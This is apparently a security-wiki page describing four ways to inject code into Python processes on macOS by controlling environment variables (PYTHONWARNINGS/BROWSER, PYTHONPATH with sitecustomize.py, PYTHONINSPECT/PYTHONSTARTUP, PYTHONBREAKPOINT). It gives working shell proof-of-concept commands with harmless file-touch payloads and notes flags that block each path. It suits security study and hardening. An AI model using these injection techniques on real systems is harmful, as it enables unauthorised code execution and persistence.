# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via the `PYTHONWARNINGS` and `BROWSER` environment variables

If an attacker can control a Python process's environment, the combination of `PYTHONWARNINGS` and `BROWSER` can trigger command execution when Python imports the `antigravity` module while processing a crafted warning option. The technique relies on `antigravity` opening a URL with Python's `webbrowser` module, which honors the `BROWSER` environment variable.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` and `sitecustomize.py`

During normal startup Python's `site` module adds site-specific paths and then attempts to import a module named `sitecustomize`. By placing an attacker-readable directory first on `PYTHONPATH`, an attacker who controls the process environment can make Python import a payload before the target script. The `-S` flag disables automatic `site` initialization, while isolated mode (`-I`) ignores `PYTHONPATH` and implies `-s` and `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

For persistence through a writable user site rather than an inherited `PYTHONPATH`, see [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Via `PYTHONINSPECT` and `PYTHONSTARTUP` after a script

On CPython 3.13+, a script launched with `PYTHONINSPECT=1` enters an interactive session when it finishes. If standard input is a terminal and PyREPL is available, that session executes the file named by `PYTHONSTARTUP` **after** the target script and before the prompt. An attacker who controls both inherited variables and a readable startup file can therefore run code in the target process without modifying its script. This is a post-script trigger, not a normal startup hook.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

The chain does not execute the startup file on older CPython versions, with non-terminal standard input, or when `PYTHON_BASIC_REPL` forces the basic REPL. `-E` and `-I` ignore the `PYTHON*` variables. Check the actual interpreter and terminal context before relying on this path.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Since Python 3.7 (PEP 553) the built-in `breakpoint()` imports and calls whatever `sys.breakpointhook` points to, and that target is taken from the **`PYTHONBREAKPOINT`** environment variable (`package.module.callable`). Importing the named module and calling the callable both run before the debugger would normally appear, so an attacker who controls the environment of a process that reaches a `breakpoint()` (common in maintenance/debug scripts, and sometimes left in production paths) gets code execution.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Unlike `PYTHONWARNINGS`/`PYTHONPATH` this needs the target to actually reach a `breakpoint()` call, but it also works purely through the **import side effects** of the named module (point it at any importable module — for example one placed first on `PYTHONPATH` — whose top level runs code). Setting `PYTHONBREAKPOINT=0` disables the hook entirely.



## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line and environment](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Built-in breakpoint() and PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [CPython interpreter REPL dispatch (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [CPython PyREPL startup-file execution (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
